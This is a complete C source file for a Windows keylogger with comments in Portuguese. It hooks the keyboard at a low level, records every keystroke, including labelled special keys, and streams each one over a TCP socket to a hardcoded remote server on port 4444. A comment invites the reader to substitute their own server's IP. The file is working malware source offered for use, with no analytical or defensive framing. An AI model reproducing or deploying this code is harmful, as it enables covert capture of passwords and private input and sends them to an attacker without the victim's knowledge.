#include <stdio.h>
#include <windows.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

#define SERVER_IP "192.168.1.100"  // 🛑 Substitua pelo IP do servidor
#define PORT 4444  // Porta usada para comunicação

HHOOK hook;
SOCKET sock;

// Mapeia teclas especiais
const char* getSpecialKey(DWORD vkCode) {
    switch (vkCode) {
        case VK_RETURN: return "[ENTER]";
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_SHIFT: return "[SHIFT]";
        case VK_CONTROL: return "[CTRL]";
        case VK_MENU: return "[ALT]";
        case VK_CAPITAL: return "[CAPS_LOCK]";
        case VK_ESCAPE: return "[ESC]";
        case VK_SPACE: return "[SPACE]";
        case VK_LEFT: return "[LEFT]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_UP: return "[UP]";
        case VK_DOWN: return "[DOWN]";
        case VK_DELETE: return "[DEL]";
        default: return NULL;
    }
}

// Callback para capturar as teclas
LRESULT CALLBACK KeyLogger(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *key = (KBDLLHOOKSTRUCT *)lParam;
        char buffer[64];

        const char *specialKey = getSpecialKey(key->vkCode);
        if (specialKey) {
            sprintf(buffer, "%s ", specialKey);
        } else {
            sprintf(buffer, "%c", key->vkCode);
        }

        send(sock, buffer, strlen(buffer), 0);
    }
    return CallNextHookEx(hook, nCode, wParam, lParam);
}

// Conecta ao servidor
void ConnectToServer() {
    WSADATA wsa;
    struct sockaddr_in serverAddr;

    WSAStartup(MAKEWORD(2, 2), &wsa);
    sock = socket(AF_INET, SOCK_STREAM, 0);

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(PORT);
    serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);

    connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
}

// Configura o hook do teclado
void SetHook() {
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyLogger, GetModuleHandle(NULL), 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

// Remove o hook
void Unhook() {
    UnhookWindowsHookEx(hook);
    closesocket(sock);
    WSACleanup();
}

int main() {
    ConnectToServer();
    SetHook();
    Unhook();
    return 0;
}
